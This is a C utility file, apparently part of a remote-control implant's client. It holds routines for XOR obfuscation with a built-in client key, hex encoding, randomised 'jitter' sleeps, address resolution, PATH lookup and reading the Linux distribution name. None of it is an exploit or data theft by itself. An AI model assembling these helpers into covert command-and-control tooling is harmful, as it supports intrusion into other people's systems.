#include "inc/util.h"

#include <stdbool.h>
#include <sys/socket.h>

#include <stdarg.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <errno.h>
#include <netdb.h>
#include <stdio.h>

#include <time.h>

void print_debug(const char *func, const char *msg, ...) {
  if (!SHRK_DEBUG)
    return;

  va_list args;
  va_start(args, msg);

  printf("[%s] ", func);
  vprintf(msg, args);
  printf("\n");

  va_end(args);
}

void print_debug_dump(const char *func, uint8_t *buf, uint16_t size) {
  if (!SHRK_DEBUG)
    return;

  printf("--- start of dump from [%s] ---\n", func);

  for (uint16_t i = 0; i < size; i++) {
    if (!(i % 10))
      printf(i != 0 ? "\n0x%04x: " : "0x%04x: ", i);

    printf("0x%02x ", buf[i]);

    if (i == size - 1)
      printf("\n");
  }

  printf("---- end of dump from [%s] ----\n", func);
}

uint64_t copy(void *dst, void *src, uint64_t size) {
  memcpy(dst, src, size);
  return size;
}

uint64_t randint(uint64_t min, uint64_t max) {
  return min + rand() % (max + 1 - min);
}

void randseed() {
  /*

   * teacher: i want everybody in this class to succeed
   * the kid named seed: 0_0

  */
  srand(time(NULL));
}

uint64_t xorck(char *s, uint64_t l) {
  for (uint64_t i = 0; i < l; i++)
    s[i] ^= SHRK_CLIENT_KEY[i % CLIENT_KEY_SIZE];
  return l * ENCRYPTED_BYTE_SIZE;
}

uint64_t encode(char *s, uint64_t l) {
  uint8_t cp[l];

  memcpy(cp, s, l);
  bzero(s, l);

  for (uint64_t i = 0; i < l; i++)
    sprintf(s + (i * ENCODED_BYTE_SIZE), "%02x", cp[i]);

  return l * ENCODED_BYTE_SIZE;
}

uint64_t decode(char *s, uint64_t l) {
  if ((l % ENCODED_BYTE_SIZE) != 0) {
    errno = EINVAL;
    return 0;
  }

  char *cp = s;

  for (; *s != 0; s += 2)
    sscanf(s, "%02hhx", cp++);

  return l / ENCODED_BYTE_SIZE;
}

void jitter() {
  sleep(randint(3, 5));
}

bool resolve(struct addrinfo *info, struct sockaddr *saddr, char *addr, uint16_t port) {
  if (NULL == saddr || NULL == addr) {
    errno = EINVAL;
    return false;
  }

  struct addrinfo *res = NULL, *cur = NULL;
  bool             ret = false;

  if (getaddrinfo(addr, NULL, NULL, &res) < 0)
    goto end;

  if (NULL == res)
    goto end;

  for (cur = res; cur != NULL; cur = cur->ai_next) {
    if (AF_INET == cur->ai_family || AF_INET6 == cur->ai_family)
      break;
  }

  if (NULL == cur)
    goto end;

  if (NULL != info)
    memcpy(info, cur, sizeof(struct addrinfo));
  memcpy(saddr, cur->ai_addr, sizeof(struct sockaddr));

  switch (saddr->sa_family) {
  case AF_INET:
    ((struct sockaddr_in *)saddr)->sin_port = htons(port);
    break;

  case AF_INET6:
    ((struct sockaddr_in6 *)saddr)->sin6_port = htons(port);
    break;

  default:
    errno = EPROTONOSUPPORT;
    goto end;
  }

  ret = true;
end:
  freeaddrinfo(res);
  return ret;
}

bool path_find(char *executable) {
  char    *path = strdup(getenv("PATH")), *save = NULL, *el = NULL;
  uint32_t exec_size = strlen(executable);
  bool     ret       = false;

  if (NULL == path)
    goto end;

  if ((el = strtok_r(path, ":", &save)) == NULL)
    goto end;

  do {
    char fp[strlen(el) + exec_size + 2];
    sprintf(fp, "%s/%s", el, executable);

    if (access(fp, X_OK) == 0) {
      ret = true;
      goto end;
    }
  } while ((el = strtok_r(NULL, ":", &save)) != NULL);

end:
  free(path);
  return ret;
}

char *get_distro() {
  char    *line = NULL, *distro = NULL, *c = NULL;
  uint64_t line_size = 0;
  FILE    *distf     = NULL;

  if ((distf = fopen("/etc/os-release", "r")) == NULL)
    return NULL;

  if (getline(&line, &line_size, distf) <= 1)
    goto fail;

  /*

   * we need to parse out the first line
   * which looks like: NAME="Arch Linux"
   * so lets first get to the start of the name

  */
  for (c = line;; c++) {
    // did we reach the end?
    if (*c == 0)
      goto fail;

    // wait till we skip at least one char
    if (c == line)
      continue;

    // skip till we get to ="
    if (*c == '"' && *(c - 1) == '=') {
      distro = strdup(++c); // the line will be freed so lets just duplicate it
      break;
    }
  }

  // lets find the '"' at the end and remove it
  for (c = distro; *c != '"'; c++)
    if (*c == 0)
      goto fail;

  *c = 0;
  goto end;

fail:
  free(distro);
  distro = NULL;
end:
  free(line);
  return distro;
}